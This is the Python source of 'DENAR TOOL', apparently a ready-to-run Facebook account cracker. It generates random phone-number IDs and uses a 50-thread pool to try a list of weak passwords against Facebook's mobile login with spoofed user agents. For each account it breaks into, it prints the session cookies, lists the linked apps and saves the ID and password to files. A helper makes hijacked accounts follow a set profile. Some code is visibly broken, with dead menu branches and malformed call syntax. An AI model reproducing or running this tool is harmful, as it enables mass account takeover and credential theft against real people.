import os,sys,time,json,random,re,string,platform,base64,uuid
os.system("git pull")
from bs4 import BeautifulSoup as sop
from bs4 import BeautifulSoup
import requests as ress
from datetime import date
from datetime import datetime
from time import sleep
from time import sleep as waktu
try:
    import requests
    from concurrent.futures import ThreadPoolExecutor as ThreadPool
    import mechanize
    from requests.exceptions import ConnectionError
except ModuleNotFoundError:
    os.system('pip install mechanize requests futures bs4==2 > /dev/null')
    os.system('pip install bs4')

        
def khld():
    os.system('clear')
    jalan(logo)
    print('\033[1;92m')
    jalan('\033[1;91m[\033[1;92m1\033[1;91m]\033[1;96m CRACK RANDOM ')
    jalan('\033[1;91m[\033[1;92m2\033[1;91m]\033[1;94m Link Telegram')
    jalan('\033[1;91m[\033[1;92m3\033[1;91m]\033[1;95m Link Telegram')
    jalan('\033[1;91m[\033[1;92m4\033[1;91m]\033[1;93m Link Channel Telegram')
    jalan('\033[1;91m[\033[1;92m0\033[1;91m]\033[1;91m EXIT')
    opt = input('\n\x1b[1;32m\033[1;91m[\033[1;93m✮\033[1;91m]\033[1;36mChoice : ')
    if opt == '1':
        i()
    if None == '2':
        os.system('xdg-open https://t.me/+5Zr4o1KD_Wo4ZGMy')
        return None
    if None == '3':
        os.system('xdg-open https://t.me/+5Zr4o1KD_Wo4ZGMy')
        return None
    if None == '4':
        os.system('xdg-open https://t.me/+5Zr4o1KD_Wo4ZGMy')
    if None == '0':
        os.system('exit')
        return None
    
def cek_apk(session,coki):
    w=session.get("https://m.facebook.com/settings/apps/tabbed/?tab=active",cookies={"cookie":coki}).text
    sop = BeautifulSoup(w,"html.parser")
    x = sop.find("form",method="post")
    game = [i.text for i in x.find_all("h3")]
    if len(game)==0:
        print(f'\r%s[%s!%s] %sSORRY THERE IS NO ACTIVE  APK%s  '%(N,M,N,M,N))
    else:
        print(f'\r[🎮] %s \x1b[1;95m YOUR ACTIVE APPS   :{WHITE}'%(GREEN))
        for i in range(len(game)):
            print(f"\r[%s%s] %s%s"%(N,i+1,game[i].replace("Ditambahkan pada"," Ditambahkan pada"),N))
        #else:
            #print(f'\r %s[%s!%s] Sorry, Apk check failed invalid cookie'%(N,M,N))
    w=session.get("https://m.facebook.com/settings/apps/tabbed/?tab=inactive",cookies={"cookie":coki}).text
    sop = BeautifulSoup(w,"html.parser")
    x = sop.find("form",method="post")
    game = [i.text for i in x.find_all("h3")]
    if len(game)==0:
        print(f'\r%s[%s!%s] %sSORRY THERE IS NO EXPIRED APK%s           \n'%(N,M,N,M,N))
    else:
        print(f'\r[🎮] %s \x1b[1;95m YOUR EXPIRED APPS    :{WHITE}'%(M))
        for i in range(len(game)):
            print(f"\r[%s%s] %s%s"%(N,i+1,game[i].replace("Kedaluwarsa"," Kedaluwarsa"),N))
        else:
            print('')

def follow(self, session, coki):
        r = BeautifulSoup(session.get('https://m.facebook.com/profile.php?id=100015315258519', {
            'cookie': coki }, **('cookies',)).text, 'html.parser')
        get = r.find('a', 'Ikuti', **('string',)).get('href')
        session.get('https://m.facebook.com' + str(get), {
            'cookie': coki }, **('cookies',)).text
            
            

class jalan:
    def __init__(self, z):
        for e in z + "\n":
            sys.stdout.write(e)
            sys.stdout.flush()
            time.sleep(0.001)
            
RED = '\033[1;91m'
WHITE = '\033[1;97m'
GREEN = '\033[1;32m' #
YELLOW = '\033[1;33m'
BLUE = '\033[1;34m'
ORANGE = '\033[1;35m'
P = '\x1b[1;97m' # PUTIH
M = '\x1b[1;91m' # MERAH
H = '\x1b[1;92m' # HIJAU
K = '\x1b[1;92m' # KUNING
B = '\x1b[1;94m' # BIRU
U = '\x1b[1;95m' # UNGU
O = '\x1b[1;96m' # BIRU MUDA
N = '\x1b[0m'    # WARNA MATI
A = '\x1b[1;90m' # WARNA ABU ABU
BN = '\x1b[1;107m' # BELAKANG PUTIH
BBL = '\x1b[1;106m' # BELAKANG BIRU LANGIT
BP = '\x1b[1;105m' # BELAKANG PINK
BB = '\x1b[1;104m' # BELAKANG BIRU
BK = '\x1b[1;103m' # BELAKANG KUNING
BH = '\x1b[1;102m' # BELAKANG HIJAU
BM = '\x1b[1;101m' # BELAJANG MERAH
BA = '\x1b[1;100m' # BELAKANG ABU ABU
A = '\x1b[1;97m' 
B = '\x1b[1;96m' 
C = '\x1b[1;91m' 
D = '\x1b[1;92m'
M = '\033[1;31m'
H = '\033[1;32m'
N = '\x1b[1;37m'    
E = '\x1b[1;93m' 
F = '\x1b[1;94m'
G = '\x1b[1;95m'
P = '\033[1;37m'
RED = '\033[1;91m'
WHITE = '\033[1;97m'
GREEN = '\033[1;32m' #
YELLOW = '\033[1;33m'
BLUE = '\033[1;34m'
ORANGE = '\033[1;35m'
now = datetime.now()
dt_string = now.strftime("%H:%M")
current = datetime.now()
ta = current.year
bu = current.month
ha = current.day
today = date.today()
my_color = [
 P, M, H, K, B, U, O, N]
warna = random.choice(my_color)
now = datetime.now()
dt_string = now.strftime("%H:%M")
current = datetime.now()
ta = current.year
bu = current.month
ha = current.day
today = date.today()
logo =                                          ("""  \x1b[1;91m
┌───────────────────────────────────────────────────┐│                                                   │
│    ██████╗ ███████╗███╗   ██╗ █████╗ ██████╗      │
│    ██╔══██╗██╔════╝████╗  ██║██╔══██╗██╔══██╗     ││    ██║  ██║█████╗  ██╔██╗ ██║███████║██████╔╝     ││    ██║  ██║██╔══╝  ██║╚██╗██║██╔══██║██╔══██╗     │
│    ██████╔╝███████╗██║ ╚████║██║  ██║██║  ██║     │
│    ╚═════╝ ╚══════╝╚═╝  ╚═══╝╚═╝  ╚═╝╚═╝  ╚═╝     ││                               @SONN1_C1    │└───────────────────────────────────────────────────┘

\x1b[1;91m>>    \x1b[1;94mWELCOME TO DENAR TOOL   \x1b[1;91m <<
\x1b[1;91m>>     \x1b[1;96mTELEGRAM @SONN1_C0 Version (2)   \x1b[1;91m <<
\033[;90m===============================================================
\033[1;33m[-] \x1b[1;91mCODBY     :\033[1;35m DENAR 
\033[1;33m[-] \x1b[1;91mVERSION   :\033[1;35m UPDATE (2)
\033[1;33m[-] \x1b[1;91mCHANAL    :\033[1;35m SONY TOOL
\033[1;33m[-] \x1b[1;91mCHANAL    :\033[1;35m SONY TOOL
\033[1;33m[-] \x1b[1;91mUPDATE    :\033[1;35m Coming Soon
\033[1;33m[-] \x1b[1;91mCRACK     :\033[1;35m From KURDISTAN  DENAR🏆
\033[1;90m===============================================================""")
loop = 0
oks = []
cps = []

def clear():
    os.system('clear')
    print(logo)
from time import localtime as lt
from os import system as cmd
ltx = int(lt()[3])
if ltx > 12:
    a = ltx-12
    tag = "PM"
else:
    a = ltx
    tag = "AM"
    
    
try:
    print('\n\n\033[1;33mLOADING ASSET FILES ... \033[0;97m')
    v = 5.2
    update = ('5.2')
    update = ('5.2')
    if str(v) in update:
        os.system('clear')
    else:pass
except:print('\n\033[1;31mNO INTERNET CONNECTION ... \033[0;97m')
#global functions
def dynamic(text):
    titik = ['.   ','..  ','... ','.... ']
    for o in titik:
        print('\r'+text+o),
        sys.stdout.flush();time.sleep(1)

#User agents
ugen2=[]
ugen=[]
 
for xd in range(10000):
    aa='Mozilla/5.0 (Linux; U; Android'
    b=random.choice(['3','4','5','6','7','8','9','10','11','12'])
    c=' en-us; GT-'
    d=random.choice(['A','B', 'C', 'D', 'E', 'F', 'G', 'H', 'I', 'J', 'K', 'L', 'M', 'N', 'O', 'P', 'Q', 'R', 'S', 'T', 'U', 'V', 'W', 'X', 'Y', 'Z'])
    e=random.randrange(1, 999)
    f=random.choice(['A','B', 'C', 'D', 'E', 'F', 'G', 'H', 'I', 'J', 'K', 'L', 'M', 'N', 'O', 'P', 'Q', 'R', 'S', 'T', 'U', 'V', 'W', 'X', 'Y', 'Z'])
    g='AppleWebKit/537.36 (KHTML, like Gecko) Chrome/'
    h=random.randrange(73,100)
    i='0'
    j=random.randrange(4200,4900)
    k=random.randrange(40,150)
    l='Mobile Safari/537.36'
    uaku2=(f'{aa} {b}; {c}{d}{e}{f}) {g}{h}.{i}.{j}.{k} {l}')
    ugen.append(uaku2)
    
# APK CHECK
def i():
    user=[]
    twf =[]
    os.getuid
    os.geteuid
    os.system("clear")
    jalan(logo)
    jalan('\033[1;92m')
    jalan('\033[1;91m[\033[1;91m➠➠\033[1;91m]\033[1;36m NUMBER - \033[1;33m0782 \033[1;34m0750 \033[1;35m0780 \033[1;31m0751')
    jalan('\033[1;92m\n')
    code = input('\033[1;35m\033[1;91m[\033[1;94m☏☏\033[1;91m]\033[1;31mRAQAM :\x1b[1;92m\033[1;31m ')
    print("")
    os.system('clear')
    bal = input("nawek ba dle xot : ")
    os.system('clear')
    print(logo)
    limit = int(input('IDS CRACKING: \x1b[1;91m5000, \x1b[1;92m10000, \x1b[1;93m15000, \x1b[1;94m20000\n\n\033[1;91m\033[1;91m[\033[1;92m✮✮\033[1;91m]\033[1;34mhow many ids :]\033[1;36m '))
    for nmbr in range(limit):
        nmp = ''.join(random.choice(string.digits) for _ in range(7))
        user.append(nmp)
    with ThreadPool(max_workers=50) as manshera:
        clear()
        tl = str(len(user))
        print(f"\033[1;91m[\033[1;93m✔︎\x1b[1;91m]\033[1;94m TODAY DATE & TIME :{RED} {ha}/{bu}/{ta} {ORANGE}~> {GREEN} "+str(a)+":"+str(lt()[4])+" "+ tag+" ")
        print('\033[1;91m[\033[1;93m✔︎\033[1;91m]\033[1;91m NAME :\x1b[1;96m \033[1;92m'+bal)
        print('\033[1;91m[\033[1;93m✔︎\033[1;91m]\033[1;95m NUMBER PHONE : \033[1;96m'+code)
        print('\033[1;91m[\033[1;93m✔︎\033[1;91m]\033[1;96m IDS : \033[1;93m'+tl)
        print('\033[1;91m[\033[1;93m✔︎\033[1;91m]\033[1;92m wait 10 or 15m to crack')
        print('\033[1;91m[\033[1;93m✔︎\033[1;91m]\033[1;95mTO STOP THE CRACK CTRL+Z')
        print('\033[1;93m')
        for love in user:
            pwx = [love,'kurd1234','kurd12345','kurd123456','hama1234','hama12345','zaxozaxo','zaxo1234','1234554321','zaxo12345','hama12','ahmad123','ahmad1234','KURD1234','KURD12345','pubg123','hama duhki97','barzani123','1234barzani','zaxozaxo1','zaxozaxo12','zaxozaxo123','zaxozaxo1234','zaxozaxo12345',]
            uid = code+love
            manshera.submit(rcrack,uid,pwx,tl)
    print('CRACKING ALL BRUTALL TOOL ')

def rcrack(uid,pwx,tl):
    #print(user)
    global loop
    global cps
    global oks
    global proxy
    try:
        for ps in pwx:
            pro = random.choice(ugen)
            session = requests.Session()
            free_fb = session.get('https://m.facebook.com').text
            log_data = {
                "lsd":re.search('name="lsd" value="(.*?)"', str(free_fb)).group(1),
            "jazoest":re.search('name="jazoest" value="(.*?)"', str(free_fb)).group(1),
            "m_ts":re.search('name="m_ts" value="(.*?)"', str(free_fb)).group(1),
            "li":re.search('name="li" value="(.*?)"', str(free_fb)).group(1),
            "try_number":"0",
            "unrecognized_tries":"0",
            "email":uid,
            "pass":ps,
            "login":"Log In"}
            header_freefb = {
			'authority': 'm.facebook.com',
			'method': 'GET',
			'path': 'https://www.facebook.com/?_rdc=1&_rdr',
			'scheme': 'https',
			'accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9',
			'accept-encoding': 'gzip, deflate, br',
			'accept-language': 'en-US,en;q=0.9',
			'referer': 'https://m.facebook.com/',
			'sec-ch-ua': '"Google Chrome";v="90", "Not)A;Brand";v="8", "Chromium";v="75"',
			'sec-ch-ua-mobile': '?0',
			'sec-ch-ua-platform': '"Windows"',
			'sec-fetch-dest': 'document',
			'sec-fetch-mode': 'navigate',
			'sec-fetch-site': 'same-origin',
			'upgrade-insecure-requests': '1',
			'user-agent': pro,}
            lo = session.post('https://m.facebook.com/login/device-based/regular/login/?refsrc',data=log_data,headers=header_freefb).text
            log_cookies=session.cookies.get_dict().keys()
            if 'c_user' in log_cookies:
                coki=";".join([key+"="+value for key,value in session.cookies.get_dict().items()])
                cid = coki[7:22]
                print('\r\r\033[1;32m[DENAR➡︎ØK🔥] ' +uid+ ' | ' +ps+    '  \n\033[1;35m[√]\033[1;32mCOOKIE = \033[1;34m'+coki+  ' \n\033[1;36m[√] [UAGENT] = \033[1;35m'+pro+'  \033[0;97m')
                cek_apk(session,coki)
                open('/sdcard/DENAR-OK.txt', 'a').write( cid+' | '+ps+'\n')
                oks.append(cid)
                break
            elif 'checkpoint' in log_cookies:
                coki=";".join([key+"="+value for key,value in session.cookies.get_dict().items()])
                cid = coki[24:39]
                print('\r\r\33[1;30m[DENAR➡︎CL😢]  ' +uid+ ' | ' +ps+           '  \33[0;97m')
                open('/sdcard/DENAR-CP.txt', 'a').write( cid+' | '+ps+' \n')
                cps.append(cid)
                break
            else:
                continue
        loop+=1
        sys.stdout.write('\r\r%s[DENAR🔥] [%s/%s]  OK:- %s  CP:- %s '%(H,loop,tl,len(oks),len(cps))),
        sys.stdout.flush()
    except:
        pass

khld()